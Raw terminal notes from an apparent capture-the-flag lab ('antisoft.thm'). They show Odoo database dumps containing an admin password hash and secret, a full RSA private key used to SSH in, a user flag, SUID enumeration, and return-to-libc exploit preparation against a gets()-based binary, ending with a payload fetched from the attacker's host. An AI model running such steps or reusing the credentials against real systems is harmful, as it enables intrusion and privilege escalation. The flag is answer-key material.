 public | ir_actions_todo                               | table | odoo
 public | ir_attachment                                 | table | odoo
 public | ir_config_parameter                           | table | odoo
 public | ir_config_parameter_groups_rel                | table | odoo
 public | ir_cron                                       | table | odoo
 public | ir_exports                                    | table | odoo
 public | ir_exports_line                               | table | odoo
 public | ir_filters                                    | table | odoo
 public | ir_logging                                    | table | odoo
 public | ir_mail_server                                | table | odoo
 public | ir_model                                      | table | odoo
 public | ir_model_access                               | table | odoo
 public | ir_model_constraint                           | table | odoo
 public | ir_model_data                                 | table | odoo
 public | ir_model_fields                               | table | odoo
 public | ir_model_fields_anonymization                 | table | odoo
 public | ir_model_fields_anonymization_history         | table | odoo
 public | ir_model_fields_anonymization_migration_fix   | table | odoo
 public | ir_model_fields_anonymize_wizard              | table | odoo
 public | ir_model_fields_group_rel                     | table | odoo
 public | ir_model_relation                             | table | odoo
 public | ir_module_category                            | table | odoo
 public | ir_module_module                              | table | odoo
 public | ir_module_module_dependency                   | table | odoo
 public | ir_property                                   | table | odoo
 public | ir_rule                                       | table | odoo
 public | ir_sequence                                   | table | odoo
 public | ir_sequence_date_range                        | table | odoo
 public | ir_server_object_lines                        | table | odoo
 public | ir_translation                                | table | odoo
 public | ir_ui_menu                                    | table | odoo
 public | ir_ui_menu_group_rel                          | table | odoo
 public | ir_ui_view                                    | table | odoo
 public | ir_ui_view_custom                             | table | odoo
 public | ir_ui_view_group_rel                          | table | odoo
 public | ir_values                                     | table | odoo
 public | rel_modules_langexport                        | table | odoo
 public | rel_server_actions                            | table | odoo
 public | res_bank                                      | table | odoo
 public | res_company                                   | table | odoo
 public | res_company_users_rel                         | table | odoo
 public | res_config                                    | table | odoo
 public | res_config_installer                          | table | odoo
 public | res_config_settings                           | table | odoo
 public | res_country                                   | table | odoo
 public | res_country_group                             | table | odoo
 public | res_country_res_country_group_rel             | table | odoo
 public | res_country_state                             | table | odoo
 public | res_currency                                  | table | odoo
 public | res_currency_rate                             | table | odoo
 public | res_font                                      | table | odoo
 public | res_groups                                    | table | odoo
 public | res_groups_action_rel                         | table | odoo
 public | res_groups_implied_rel                        | table | odoo
 public | res_groups_report_rel                         | table | odoo
 public | res_groups_users_rel                          | table | odoo
 public | res_lang                                      | table | odoo
 public | res_partner                                   | table | odoo
 public | res_partner_bank                              | table | odoo
 public | res_partner_category                          | table | odoo
 public | res_partner_res_partner_category_rel          | table | odoo
 public | res_partner_title                             | table | odoo
 public | res_request_link                              | table | odoo
 public | res_users                                     | table | odoo
 public | res_users_log                                 | table | odoo
 public | rule_group_rel                                | table | odoo
 public | web_editor_converter_test                     | table | odoo
 public | web_editor_converter_test_sub                 | table | odoo
 public | web_planner                                   | table | odoo
 public | web_tour_tour                                 | table | odoo
 public | wizard_ir_model_menu_create                   | table | odoo
 public | wkf                                           | table | odoo
 public | wkf_activity                                  | table | odoo
 public | wkf_instance                                  | table | odoo
 public | wkf_transition                                | table | odoo
 public | wkf_triggers                                  | table | odoo
 public | wkf_witm_trans                                | table | odoo
 public | wkf_workitem                                  | table | odoo
(110 rows)




main=# \d res_users
                                          Table "public.res_users"
     Column     |            Type             | Collation | Nullable |          
      Default                
----------------+-----------------------------+-----------+----------+----------
-----------------------------
 id             | integer                     |           | not null | nextval('
res_users_id_seq'::regclass)
 active         | boolean                     |           |          | true
 login          | character varying           |           | not null | 
 password       | character varying           |           |          | NULL::cha
racter varying
 company_id     | integer                     |           | not null | 
 partner_id     | integer                     |           | not null | 
 create_date    | timestamp without time zone |           |          | 
 share          | boolean                     |           |          | 
 write_uid      | integer                     |           |          | 
 create_uid     | integer                     |           |          | 
 action_id      | integer                     |           |          | 
 write_date     | timestamp without time zone |           |          | 
 signature      | text                        |           |          | 
 password_crypt | character varying           |           |          | 
...



main=# SELECT login, password, password_crypt FROM res_users;
       login        | password |                                                
           password_crypt                                                       
    
--------------------+----------+------------------------------------------------
--------------------------------------------------------------------------------
----
 default            |          | 
 public             |          | 
 admin@antisoft.thm |          | $pbkdf2-sha512$12000$lBJiDGHMOcc4Zwwh5Dzn/A$x.E
Z/PrEodzEJ5r4JfQo2KsMZLkLT97xWZ3LsMdgwMuK1Ue.YCzfElODfWEGUOc7yYBB4fMt87ph8Sy5tN4
nag
(3 rows)

main=# 



main=# SELECT key, value FROM ir_config_parameter;
         key          |                value                 
----------------------+--------------------------------------
 database.secret      | 812560d9-caa9-49fd-9986-ab3d6741a9f7
 database.create_date | 2022-07-23 10:51:18
 database.uuid        | 61fc1abe-0a75-11ed-b7ad-0242ac110003
 web.base.url         | http://antisoft.thm
(4 rows)

main=# 




-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEAxuNhK456dD+WXwoMLkfzQPvBsbnN27Aq8NfCVp4625XyoXi+
i2g2nYNOarOGX+/q/M0UmoObiaJOPLLig9oFm8ZPxHtmVgOTX2Go1pDWotEHZHL3
GdQ+W8lkg+h/X2C5WwlqUjcQxBuPsMgvZB4W714u5FpFOhiKtMwh20VX8AcwptJ8
ET4m79e+lChbPJqsQZcmtKkjzWhlIimfZWhYHca7DtljYpQf4+uVIle6diy5xot7
lxNniPc9v1y1YFSHYrFfFYmlnniWnBrVhXBw0sydJTnISxvI1p7pw4vMZX441oHb
FNsC+oCtW36HPEprpySilvIzdv1d8N56cW6BZQIDAQABAoIBAQCnb6NNbPxwQ1wP
lMDecZo7Wfcd7UN+MJhl++5Sx5Dbbig+gg1ABbL89h8dOxfkSnG0893lmuhlfWuK
NDr4L6LLGq/qxMxJm2cFRI1EXdkkZv9nNFYMu57n3OsvFZutqxtApfOJVWxa/K0C
cfVbvu0mBU9K1Sg0mZakULosA/vdSGQGXdyS1UmDNSLbfnffyccdk+TiB0mnKpp5
JfE3yML08AJYruEG7ZoNMM170RFtE40al1aox7X9fxe434+sTlBHWXNf+FkHTO8O
gQRQZKEDA2mMpUflMDRSyRjmoZfap7i9LCea4U7jlUeFH13ex3Sgbj6zOeIKMpCq
XBUKaSmhAoGBAOut6/PntcLUJns9oF1I6a4+343Au+Trx3UGeQCXOwIb1WhAXBH4
OvKZEK0qb76MANTU3VdqLXXLwharMd/AyXYX0cXObVQ7FWWF318+3JgVU7q65yx1
11+ZCIaRJfJDEjvbroEvD9xbPcDj3naYaJyqc2mV9OPov8cqAe8PZ+dZAoGBANgJ
YKRJUSyNP2E5xENkaUvQ+OODN4cwMO0yB4QAbFfSvZiR1vVllbgWlQQciAm7WY4j
ovQGrC6/tBr2ylza7hYFq3mNb1vvvKOZSr8x/FYhvoSpA4vMxDFmGM8Fc/gd3guv
LSPPP5nM1GBbgydL3rY5ZIhwCOQOj2ymqoKQkXTtAoGALFgGHFdNqMHYF7opsUOl
zEZCM96+u7ztQ4SbQdQyoxvvlHT/ndXx6XGJZLumWNjo0yLWHrt4oEBdXXyKnsoc
Xd7vdmN3yLBxPy/oLniacvcYUPsXwhLOGkumAgPPevzJsn+MHvxm5JQ6U0/MrM3S
aR/dJVG0ySki5Gtv/7YLW8kCgYEAhKCtLe684OcOI/g830rDwgHW6oXiDyKsxtHR
/13rJbeBIitWlmz5D3z9mvqRIbhc8IA8SCfYiRKz1WHxNjRJukdc0FDeLsjtPFqd
oudjDNXGitbgEHFzeQg+7slgOtDLQs0Wn0daumcfctB7oiJX5fMyHvj43Fl7/64K
PAHY6rkCgYEAsVk6DjjzRQCAMoyC9H4bwAWMkvYerSkmvIo3efCMyUdKtMjg3cCv
EFmGDkEL3l6/2W3bmF6kbYDOeSyRjAaZp59QUiNliiHneD9VwCVXT/IF70O+kNkf
c7FgDFMEoa44S7BZIhxymHyGN7xgPQ6EJonUuMCfmP83KLRZrkI4FPI=
-----END RSA PRIVATE KEY-----



:~/Obscure# ssh -i id_rsa zeeshan@antisoft.thm
The authenticity of host 'antisoft.thm (10.81.150.153)' can't be established.
ECDSA key fingerprint is SHA256:f+is3cC+YlqS/Bwb1ud77WigsaSFBDdDbOmD9WIaCv4.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'antisoft.thm,10.81.150.153' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-210-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


UA Infra: Extended Security Maintenance (ESM) is not enabled.

0 updates can be applied immediately.

195 additional security updates can be applied with UA Infra: ESM
Learn more about enabling UA Infra: ESM service for Ubuntu 16.04 at
https://ubuntu.com/16-04


Last login: Sun Apr 30 20:34:56 2023 from 192.168.100.3
zeeshan@hydra:~$ 



zeeshan@hydra:~$ cat user.txt
THM{43b0b68ba2755dd6cac3b8bf5454db94}



zeeshan@hydra:~$ getent hosts
127.0.0.1       localhost
127.0.1.1       hydra
127.0.0.1       localhost ip6-localhost ip6-loopback
zeeshan@hydra:~$ find / -perm -u+s 2>/dev/null
/exploit_me
/bin/mount
/bin/umount
/bin/ping
/bin/fusermount
/bin/ping6
/bin/su
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/newuidmap
/usr/bin/at
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/newgidmap
/usr/bin/passwd
zeeshan@hydra:~$ 



root@ip-10-81-91-142:~/Obscure# chmod 777 exploit_me
root@ip-10-81-91-142:~/Obscure# file exploit_me
exploit_me: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=589ddc7b680c9a773ae64cc2db0e877b490e943e, not stripped
root@ip-10-81-91-142:~/Obscure# ldd /exploit_me
ldd: /exploit_me: No such file or directory
root@ip-10-81-91-142:~/Obscure# ldd exploit_me
	linux-vdso.so.1 (0x00007ffc47706000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f4772e06000)
	/lib64/ld-linux-x86-64.so.2 (0x00007f4773017000)
root@ip-10-81-91-142:~/Obscure# readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep system
   237: 0000000000153d00   103 FUNC    GLOBAL DEFAULT   15 svcerr_systemerr@@GLIBC_2.2.5
   619: 0000000000052290    45 FUNC    GLOBAL DEFAULT   15 __libc_system@@GLIBC_PRIVATE
  1430: 0000000000052290    45 FUNC    WEAK   DEFAULT   15 system@@GLIBC_2.2.5
root@ip-10-81-91-142:~/Obscure# strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep '/bin/sh'
 1b45bd /bin/sh
root@ip-10-81-91-142:~/Obscure# ROGadget --binary exploit_me | grep 'pop rdi'
ROGadget: command not found
root@ip-10-81-91-142:~/Obscure# ROGadget
ROGadget: command not found
root@ip-10-81-91-142:~/Obscure# 





(gdb) info registers rsp
rsp            0x7fffffffdfa8      0x7fffffffdfa8
(gdb) x/gx $rsp
0x7fffffffdfa8:	0x6161616c6161616b




zeeshan@hydra:/$ sudo -l
Matching Defaults entries for zeeshan on hydra:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User zeeshan may run the following commands on hydra:
    (ALL : ALL) ALL
    (root) NOPASSWD: /exploit_me




 400652:	41 5f                	pop    %r15
  400654:	c3                   	retq   






:~/Obscure# objdump -d exploit_me | grep -B 5 ret
  40043c:	48 8b 05 b5 0b 20 00 	mov    0x200bb5(%rip),%rax        # 600ff8 <__gmon_start__>
  400443:	48 85 c0             	test   %rax,%rax
  400446:	74 05                	je     40044d <_init+0x15>
  400448:	e8 63 00 00 00       	callq  4004b0 <__gmon_start__@plt>
  40044d:	48 83 c4 08          	add    $0x8,%rsp
  400451:	c3                   	retq   
--
  400510:	bf 48 10 60 00       	mov    $0x601048,%edi
  400515:	ff e0                	jmpq   *%rax
  400517:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  40051e:	00 00 
  400520:	5d                   	pop    %rbp
  400521:	c3                   	retq   
--
  40055d:	5d                   	pop    %rbp
  40055e:	bf 48 10 60 00       	mov    $0x601048,%edi
  400563:	ff e0                	jmpq   *%rax
  400565:	0f 1f 00             	nopl   (%rax)
  400568:	5d                   	pop    %rbp
  400569:	c3                   	retq   
--
  400579:	55                   	push   %rbp
  40057a:	48 89 e5             	mov    %rsp,%rbp
  40057d:	e8 6e ff ff ff       	callq  4004f0 <deregister_tm_clones>
  400582:	5d                   	pop    %rbp
  400583:	c6 05 be 0a 20 00 01 	movb   $0x1,0x200abe(%rip)        # 601048 <__TMC_END__>
  40058a:	f3 c3                	repz retq 
--
  4005db:	48 89 c7             	mov    %rax,%rdi
  4005de:	b8 00 00 00 00       	mov    $0x0,%eax
  4005e3:	e8 a8 fe ff ff       	callq  400490 <gets@plt>
  4005e8:	b8 00 00 00 00       	mov    $0x0,%eax
  4005ed:	c9                   	leaveq 
  4005ee:	c3                   	retq   
--
  40064b:	5d                   	pop    %rbp
  40064c:	41 5c                	pop    %r12
  40064e:	41 5d                	pop    %r13
  400650:	41 5e                	pop    %r14
  400652:	41 5f                	pop    %r15
  400654:	c3                   	retq   
  400655:	90                   	nop
  400656:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
  40065d:	00 00 00 

0000000000400660 <__libc_csu_fini>:
  400660:	f3 c3                	repz retq 
--
Disassembly of section .fini:

0000000000400664 <_fini>:
  400664:	48 83 ec 08          	sub    $0x8,%rsp
  400668:	48 83 c4 08          	add    $0x8,%rsp
  40066c:	c3                   	retq 




zeeshan@hydra:/tmp$ wget http://10.81.91.142:8000/payload
--2026-02-08 22:03:08--  http://10.81.91.142:8000/payload
Connecting to 10.81.91.142:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 104 [application/octet-stream]
Saving to: \u2018payload\u2019

payload                                  100%[=================================================================================>]     104  --.-KB/s    in 0s      

2026-02-08 22:03:08 (23.5 MB/s) - \u2018payload\u2019 saved [104/104]

zeeshan@hydra:/tmp$ ls
payload  systemd-private-df7bfb703f4b4f06bb372f26230a82a5-systemd-timesyncd.service-VFzwCC
zeeshan@hydra:/tmp$ cd ..
zeeshan@hydra:/$ cp /tmp/payload .
cp: cannot create regular file './payload': Permission denied




